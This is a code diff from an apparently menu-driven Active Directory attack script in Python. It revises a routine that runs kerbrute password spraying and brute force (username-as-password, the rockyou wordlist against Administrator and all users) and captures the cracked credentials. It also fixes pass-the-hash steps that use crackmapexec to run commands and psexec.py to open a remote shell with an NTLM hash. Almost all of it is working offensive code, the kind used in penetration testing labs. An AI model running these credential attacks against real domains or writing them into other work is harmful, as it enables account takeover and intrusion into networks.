@@ -1125,25 +1125,54 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='42':
+      found = 0
       print("\n[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
-      command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -password " + PAS.rstrip(" ") + " -outputfile passwords.txt")
+      command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -password " + PAS.rstrip(" ") + " -outputfile password1.txt")
 
-      test1 = linecache.getline("passwords.txt", 1)
-      if test1[:1] = "":
+      test1 = linecache.getline("password1.txt", 1)
+      test1 = test1.rstrip("\n")
+      if test1 != "":
+         found = 1
+         USR,PAS = test1.split(":")
+         if len(USR) < COL3: USR = padding(USR, COL3)
+         if len(PAS) < COL4: PAS = padding(PAS, COL4)
+
+      if found == 0:
          print("\n[*] Now trying all usernames with matching passwords...")
-         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords users.txt -outputfile passwords.txt")
+         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords users.txt -outputfile password2.txt")
          
-      test2 = linecache.getline("passwords.txt", 1)
-      if test2[1:] == "":
-         print("\n[*] Now trying user Administrator with random passwords...")
-         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -user Administrator -passwords /usr/share/wordlists/rockyou.txt -outputfile passwords.txt")
+      test2 = linecache.getline("password2.txt", 1)
+      test2 = test2.rstrip("\n")
+      if test2 != "":
+         found = 1
+         USR,PAS = test2.split(":")
+         if len(USR) < COL3: USR = padding(USR, COL3)
+         if len(PAS) < COL4: PAS = padding(PAS, COL4)
 
-      test3 = linecache.getline("passwords.txt", 1)
-      if test3[:1] == "":
+      if found == 0:
+         print("\n[*] Now trying user Administrator with random passwords...")
+         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -user Administrator -passwords /usr/share/wordlists/rockyou.txt -outputfile password3.txt")
+    
+      test3 = linecache.getline("password3.txt", 1)
+      test3 = test3.rstrip("\n")
+      if test3 != "":
+         found = 1
+         USR,PAS = test3.split(":")        
+         if len(USR) < COL3: USR = padding(USR, COL3)
+         if len(PAS) < COL4: PAS = padding(PAS, COL4)
+
+      if found == 0:
          print("\n[*] Now trying all users with random passwords...")
-         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords /usr/share/wordlists/rockyou.txt")
+         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile password4.txt")
      
-      os.remove("passwords.txt")
+      test4 = linecache.getline("password4.txt", 1)
+      test4 = test4.rstrip("\n")
+      if test4 != "":
+         USR,PAS = test4.split(":") 
+         if len(USR) < COL3: USR = padding(USR, COL3)
+         if len(PAS) < COL4: PAS = padding(PAS, COL4)
+
+      command("rm password*.txt")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1458,7 +1487,7 @@ while True:
 
       print("\n[*] Now trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH " + HASH +"...\n")
 
-      if HASHAR[:1] != "." and HASHAR[:1] != " " and HASHAR[:1] != "":
+      if HASH[:1] != "." and HASH[:1] != " " and HASH[:1] != "":
          command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + IMP.rstrip(" ") + " -H " + HASH + " -x 'net user Administrator /domain'")
       else:
          print("[-] No NTLM HASH was found for user " + IMP.rstrip(" ") + "...")
@@ -1482,7 +1511,7 @@ while True:
       for x in range (0,MAXX):
          if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")
 
-      if HASHAR[:1] != "." and HASHAR[:1] != " " and HASHAR[:1] != "":
+      if HASH[:1] != "." and HASH[:1] != " " and HASH[:1] != "":
          command(PATH + "psexec.py -hashes :" + HASH + " " + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))
       else:
          print("\n[-] No hash value was found for user " + IMP.rstrip(" ") + "...")
